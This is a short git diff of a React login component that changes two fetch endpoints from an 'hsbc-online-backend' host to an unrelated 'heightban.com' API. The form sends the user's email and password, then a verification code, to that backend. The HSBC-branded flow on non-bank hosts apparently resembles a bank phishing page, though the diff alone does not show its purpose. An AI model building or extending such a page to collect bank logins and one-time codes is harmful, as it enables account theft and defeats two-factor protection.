@@ -19,7 +19,7 @@ const Login = () => {
     setMessage('');
     try {
       if (step === 'login') {
-        const res = await fetch('https://hsbc-online-backend.onrender.com/api/auth/login', {
+        const res = await fetch('https://heightbansapi.heightban.com/api/auth/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, password }),
@@ -34,7 +34,7 @@ const Login = () => {
           setError('Unexpected response from server.');
         }
       } else if (step === 'verify') {
-        const res = await fetch('https://hsbc-online-backend.onrender.com/api/auth/verify-code', {
+        const res = await fetch('https://heightbansapi.heightban.com/api/auth/verify-code', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, code: code.trim() }),
